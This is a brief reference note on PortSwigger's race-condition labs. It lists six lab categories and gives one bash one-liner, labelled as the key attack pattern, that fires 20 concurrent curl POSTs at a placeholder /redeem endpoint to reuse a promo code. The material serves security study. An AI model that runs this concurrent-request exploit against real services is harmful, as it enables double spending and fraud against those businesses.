# PortSwigger Reference — Race Conditions (6 Labs)

## Source
https://portswigger.net/web-security/race-conditions

## Lab Categories (6 total)
1. Race condition basics
2. TOCTOU (Time of Check vs Time of Use)
3. Concurrent access to shared resources
4. Double spending / double payout
5. Race condition in file operations
6. Race condition in banking

## Key Attack Pattern
```bash
# Send concurrent requests to trigger race condition
seq 20 | xargs -P 20 -I {} curl -s -X POST https://TARGET/redeem \
  -H "Authorization: Bearer ***" -d 'code=PROMO10' & wait
```